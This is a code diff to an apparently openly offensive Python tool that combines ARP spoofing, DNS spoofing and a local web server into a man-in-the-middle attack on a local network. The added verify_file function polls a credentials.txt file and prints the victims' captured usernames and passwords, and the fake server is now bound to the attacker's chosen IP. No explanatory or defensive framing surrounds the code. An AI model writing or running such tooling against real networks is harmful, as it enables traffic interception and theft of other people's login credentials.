@@ -17,7 +17,6 @@ def def_handler(sig, frame):
     print(colored("\n[!] Quitting the program...\n", "red"))
     arp_spoofer.revert_spoof()
     stop_event.set()
-
     os._exit(1)
 
 signal.signal(signal.SIGINT, def_handler) # CTRL + C
@@ -55,10 +54,27 @@ def verify_root():
         print(colored("\n[!] Root privileges required.\n", "yellow"))
         os._exit(1)
 
-def server(one):
+def server(ip):
     server = Server()
-    print(colored("[+] Server initialized: http://0.0.0.0:80", "green"))
-    server.start_server()
+    print(colored(f"[+] Server initialized: http://{ip}:80", "green"))
+    server.start_server(ip)
+
+def verify_file(path):
+    while True:
+        if os.path.exists(path):
+            with open(path, 'r') as f:
+                content = f.read()
+
+                content = content.split('\n')
+                if len(content) == 3:
+                    print(colored(f"\n[+] Credentials:\n", "yellow"))
+                    print(colored(f"\tUsername: {content[0]}\n", "green"))
+                    print(colored(f"\tPassword: {content[1]}\n", "green"))
+                    def_handler('', '')
+
+
+        time.sleep(2)
+
 
 def print_banner():
     print(colored("""
@@ -79,8 +95,9 @@ def main():
 
     isValid = arp_spoofer.verify(target, interface, router, mac_address) # Verify format arguments
     define_thread(args=(target, interface, router, mac_address, stop_event, isValid), function=arp_spoofer.main)
-    define_thread(args=("",), function=server)
+    define_thread(args=(ip_server,), function=server)
     define_thread(args=(ip_server,), function=dns_spoofer.main)
+    define_thread(args=('credentials.txt',), function=verify_file)
     
     run_threads()
 
